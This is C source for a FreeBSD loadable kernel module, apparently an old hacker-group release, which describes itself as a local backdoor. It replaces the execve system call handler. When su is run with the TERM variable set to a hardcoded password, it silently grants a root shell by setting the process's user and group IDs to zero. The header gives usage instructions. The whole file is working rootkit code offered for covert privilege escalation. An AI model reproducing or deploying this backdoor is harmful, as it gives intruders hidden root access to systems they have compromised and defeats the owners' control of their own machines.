/*
 * kldbd.c coded by cthulhu Member of pkcrew (www.pkcrew.org)
 * A Local Backd00r in a kld
 *
 * How to Use :
 * export TERM=yourpassword
 * then exec the program specified in OLDPROG and enter your root shell
 *
 * tested under FreeBSD 4.0 RELEASE #0  
 */

#include <sys/param.h>
#include <sys/proc.h>
#include <sys/types.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#ifdef _KERNEL
#include <sys/systm.h>
#else
#include <string.h>
#endif
#include <sys/linker.h>
#include <sys/sysproto.h>
#include <sys/syscall.h>
#include <sys/lock.h>
#include <sys/file.h>
#include <sys/malloc.h>

/*
 * Put Here You Own Password 
 */
#define PASSWORD "pass"

/*
 * This is the Program You Must execute to obtain id = 0 
 */
#define OLDPROG  "/usr/bin/su"

/*
 * Put here the root's login shell 
 */

#define NEWPROG  "/bin/csh"

static int my_execve __P((struct proc *, struct execve_args *));
static int ifenv_T __P((char **));

static int
module_handler(module_t mod, int cmd, void *arg)
{
	switch (cmd) {
	case MOD_LOAD:
		sysent[SYS_execve].sy_call = (sy_call_t *) my_execve;
		break;
	case MOD_UNLOAD:
		sysent[SYS_execve].sy_call = (sy_call_t *) execve;
		break;
	}

	return 0;
}

static moduledata_t backdoor = {
	"backdoor",
	module_handler,
	NULL
};

DECLARE_MODULE(backd00r, backdoor, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);

static int
my_execve(p, uap)
        struct proc    *p;
        register struct execve_args *uap;
{
        
	if ((!strcmp(uap->fname, OLDPROG)) && (!ifenv_T(uap->envv))) {
		strcpy(uap->fname, NEWPROG);
		p->p_cred->p_ruid = 0;
		p->p_cred->p_rgid = 0;
		p->p_cred->pc_ucred->cr_uid = 0; 
	}

	return execve(p, uap);
}

static int
ifenv_T(environ)
        char          **environ;
{
	int             len;
	char           *np;

	len = strlen("TERM");
	np = NULL;
	for (; *environ != NULL; *environ++) {
		if ((!strncmp((*environ), "TERM", len))) {
			np = *environ + (len + 1);
			goto fterm;
		}
	}

	return -1;

      fterm:
	if (np) {
		if (!strncmp(np, PASSWORD, strlen(PASSWORD)))
			return 0;
	}

	return -1;
}
